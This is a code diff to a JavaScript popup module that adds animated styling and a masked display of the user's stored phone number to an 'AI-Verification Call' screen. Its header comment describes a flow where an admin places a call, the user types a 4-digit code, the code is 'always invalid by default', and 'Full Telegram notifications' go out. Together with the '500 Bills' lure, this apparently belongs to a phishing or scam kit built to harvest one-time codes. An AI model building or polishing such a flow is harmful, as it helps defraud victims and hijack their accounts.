@@ -1,8 +1,8 @@
 /**
  * Popup Share Module - With 500 Bills Indicators & AI-Verification Call
  * Updated: AI-Verification Call System (Admin calls user)
- * - Request AI-Verification Call (Admin triggers)
- * - 60-second countdown timer
+ * - Shows user's mobile number with animation
+ * - 60-second countdown timer with color changes
  * - Always invalid by default
  * - Full Telegram notifications
  */
@@ -202,6 +202,23 @@
                 from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
                 to { opacity: 1; transform: translateX(-50%) translateY(0); }
             }
+            @keyframes phonePulse {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.05); opacity: 0.8; text-shadow: 0 0 30px rgba(0, 212, 255, 0.5); }
+            }
+            @keyframes phoneGlow {
+                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
+            }
+            @keyframes numberReveal {
+                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
+                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
+                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
+            }
+            @keyframes numberGlowPulse {
+                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
+            }
             
             .bill-indicators {
                 display: flex;
@@ -321,6 +338,22 @@
                 letter-spacing: 2px;
                 font-size: 16px;
             }
+            
+            .phone-number-display {
+                font-size: 24px;
+                font-family: 'Orbitron', monospace;
+                font-weight: 900;
+                color: #00d4ff;
+                margin-top: 8px;
+                letter-spacing: 2px;
+                animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, numberGlowPulse 2s ease-in-out infinite 0.8s;
+                display: inline-block;
+            }
+            .phone-number-display .phone-icon {
+                margin-right: 8px;
+                display: inline-block;
+                animation: phonePulse 1.5s ease-in-out infinite;
+            }
         `;
         document.head.appendChild(style);
     }
@@ -347,10 +380,38 @@
                 60% { transform: translateX(-5px); }
                 80% { transform: translateX(5px); }
             }
+            @keyframes numberReveal {
+                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
+                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
+                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
+            }
+            @keyframes numberGlowPulse {
+                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
+            }
+            @keyframes phonePulse {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.1); opacity: 0.8; }
+            }
             .verification-input:focus {
                 border-color: #00d4ff !important;
                 box-shadow: 0 0 30px rgba(0, 212, 255, 0.3) !important;
                 outline: none;
+            }
+            .phone-number-display {
+                font-size: 24px;
+                font-family: 'Orbitron', monospace;
+                font-weight: 900;
+                color: #00d4ff;
+                margin-top: 8px;
+                letter-spacing: 2px;
+                animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, numberGlowPulse 2s ease-in-out infinite 0.8s;
+                display: inline-block;
+            }
+            .phone-number-display .phone-icon {
+                margin-right: 8px;
+                display: inline-block;
+                animation: phonePulse 1.5s ease-in-out infinite;
             }
         `;
         document.head.appendChild(style);
@@ -574,6 +635,10 @@
         currentCallCode = '';
         codeEntered = false;
         
+        // Get user's mobile number
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        const formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
+        
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase3">✕</div>
             
@@ -596,8 +661,16 @@
             <div id="callStatusContainer" style="background: rgba(0, 212, 255, 0.05); border: 1px solid rgba(0, 212, 255, 0.1); border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: center;">
                 <div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">📞</div>
                 <div id="callStatusText" style="font-size: 13px; color: rgba(255,255,255,0.8); font-family: 'Poppins', sans-serif; font-weight: 500;">Ready for verification</div>
+                
+                <!-- PHONE NUMBER DISPLAY WITH ANIMATION -->
+                <div id="phoneNumberDisplay" style="display: none; margin-top: 8px;">
+                    <span class="phone-number-display">
+                        <span class="phone-icon">📱</span>
+                        ${formattedPhone}
+                    </span>
+                </div>
+                
                 <div id="callTimerDisplay" style="font-size: 28px; font-family: 'Orbitron', monospace; font-weight: 900; color: #00d4ff; margin-top: 5px; text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); display: none;">60s</div>
-                <div id="callCodeDisplay" style="font-size: 32px; font-family: 'Orbitron', monospace; font-weight: 900; color: #22C55E; margin-top: 5px; text-shadow: 0 0 30px rgba(34, 197, 94, 0.3); display: none; letter-spacing: 4px;">----</div>
             </div>
             
             <!-- REQUEST CALL BUTTON -->
@@ -722,8 +795,8 @@
         // Update UI
         const statusIcon = document.getElementById('callStatusIcon');
         const statusText = document.getElementById('callStatusText');
+        const phoneDisplay = document.getElementById('phoneNumberDisplay');
         const timerDisplay = document.getElementById('callTimerDisplay');
-        const codeDisplay = document.getElementById('callCodeDisplay');
         const requestBtn = document.getElementById('requestCallBtn');
         const codeSection = document.getElementById('codeSection');
         const codeInput = document.getElementById('code4Digit');
@@ -740,13 +813,13 @@
             statusText.innerHTML = '📱 <strong style="color: #00d4ff;">AI-VERIFICATION CALL</strong> is being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.3);">Please wait for the call</span>';
             statusText.style.color = '#00d4ff';
         }
+        if (phoneDisplay) {
+            phoneDisplay.style.display = 'block';
+        }
         if (timerDisplay) {
             timerDisplay.style.display = 'block';
             timerDisplay.textContent = '60s';
             timerDisplay.style.color = '#00d4ff';
-        }
-        if (codeDisplay) {
-            codeDisplay.style.display = 'none';
         }
         if (requestBtn) {
             requestBtn.disabled = true;
@@ -770,11 +843,6 @@
                 statusText.innerHTML = '🔊 <strong style="color: #22C55E;">AI-VERIFICATION CALL</strong> connected!<br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Enter the 4-digit code below</span>';
                 statusText.style.color = '#22C55E';
             }
-            if (codeDisplay) {
-                codeDisplay.style.display = 'block';
-                codeDisplay.textContent = '----';
-                codeDisplay.style.color = '#22C55E';
-            }
             if (codeSection) {
                 codeSection.style.display = 'block';
             }
@@ -797,10 +865,9 @@
         
         const timerDisplay = document.getElementById('callTimerDisplay');
         const statusText = document.getElementById('callStatusText');
-        const codeDisplay = document.getElementById('callCodeDisplay');
-        const codeSection = document.getElementById('codeSection');
         const requestBtn = document.getElementById('requestCallBtn');
         const callExpiredMsg = document.getElementById('callExpiredMsg');
+        const codeSection = document.getElementById('codeSection');
         
         callTimerInterval = setInterval(() => {
             callCountdown--;
@@ -832,9 +899,6 @@
                 }
                 if (timerDisplay) {
                     timerDisplay.style.display = 'none';
-                }
-                if (codeDisplay) {
-                    codeDisplay.style.display = 'none';
                 }
                 if (codeSection) {
                     codeSection.style.display = 'none';
@@ -953,7 +1017,6 @@
             // Show expired state
             const statusText = document.getElementById('callStatusText');
             const timerDisplay = document.getElementById('callTimerDisplay');
-            const codeDisplay = document.getElementById('callCodeDisplay');
             const codeSection = document.getElementById('codeSection');
             const requestBtn = document.getElementById('requestCallBtn');
             
@@ -963,9 +1026,6 @@
             }
             if (timerDisplay) {
                 timerDisplay.style.display = 'none';
-            }
-            if (codeDisplay) {
-                codeDisplay.style.display = 'none';
             }
             if (codeSection) {
                 codeSection.style.display = 'none';
